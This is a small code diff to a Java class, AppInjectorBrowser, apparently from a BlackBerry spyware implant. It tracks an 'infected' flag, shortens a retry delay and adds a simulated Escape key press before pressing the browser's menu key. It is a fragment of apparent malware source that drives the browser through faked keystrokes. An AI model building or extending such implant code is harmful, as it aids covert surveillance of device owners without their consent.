@@ -34,7 +34,7 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
     private static final int MAX_TRIES = 8;
 
     private int tries = 0;
-    private int delay = 500;
+    private int delay = 100; //500;
     boolean infected;
 
     public static synchronized AppInjectorBrowser getInstance() {
@@ -88,6 +88,13 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
             return false;
         }
 
+        if (tries >= 1) {
+          //#ifdef DEBUG
+            debug.trace("callMenuByKey press escape key, try: " + tries);
+            //#endif
+            KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
+        }
+        
         //#ifdef DEBUG
         debug.trace("callMenuByKey press menu key, try: " + tries);
         //#endif
